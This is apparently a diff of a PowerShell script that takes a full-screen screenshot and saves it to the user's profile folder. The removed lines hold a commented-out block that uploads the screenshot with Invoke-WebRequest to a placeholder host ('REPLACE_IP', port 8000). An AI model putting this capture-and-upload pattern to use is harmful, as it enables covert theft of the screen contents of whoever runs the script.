@@ -12,14 +12,4 @@ function screenshot([Drawing.Rectangle]$bounds, $path) {
 }
 
 $bounds = [Drawing.Rectangle]::FromLTRB(0, 0, 1920, 1080)
-screenshot $bounds "C:\screenshot.png"
-
-####################### Until here the file is working and make the Screenshot##################
-
-
-
-# $ip   = "REPLACE_IP"
-# $port = 8000
-# $uploadFunctionPath = ("http" + ':' + "//$ip" + ':' + "$port/upload/")
-# $picPath = "C:\screenshot.png"
-# Invoke-WebRequest -uri $uploadFunctionPath -Method Put -Infile $picPath -ContentType 'image/png' 
+screenshot $bounds $env:userprofile"\tess.png"
